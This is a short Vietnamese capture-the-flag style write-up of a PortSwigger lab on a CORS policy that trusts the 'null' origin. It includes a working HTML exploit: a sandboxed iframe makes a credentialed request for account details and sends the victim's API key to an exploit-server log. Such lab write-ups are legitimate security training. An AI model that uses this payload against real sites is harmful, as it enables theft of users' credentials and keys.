![[cors-null.png]]
-mô tả lab: whitelist CORS có `null`. Mình tạo origin `null` bằng iframe sandbox rồi đọc API key.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

### hướng giải
- [ ] mình thử `Origin: https://evil.com` thì không được reflect, nhưng thử `Origin: null` thì server trả `Access-Control-Allow-Origin: null` + credentials true
- [ ] => nên mình cần 1 trang có origin `null`. Mình nhớ là iframe có `sandbox` thì origin của nó là `null`. Nên mình nhúng iframe sandbox trỏ về data: URL chứa JS khai thác

### giải
-bước 1: file exploit của mình:
```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'https://LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();
function reqListener() {
  location = 'https://exploit-LAB.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
}
</script>
"></iframe>
```
![[cors-null-exploit.png]]
-sau khi quan sát gói tin này, mình thấy request từ iframe gửi `Origin: null`, server tin tưởng trả về dữ liệu + credentials. API key bay về log của mình.

-bước 2: lấy API key trong log rồi submit là solve.

> [!NOTE]
> -bài học của mình: đừng bao giờ whitelist `null`. `sandbox` iframe là cách đẻ origin null nhanh nhất.
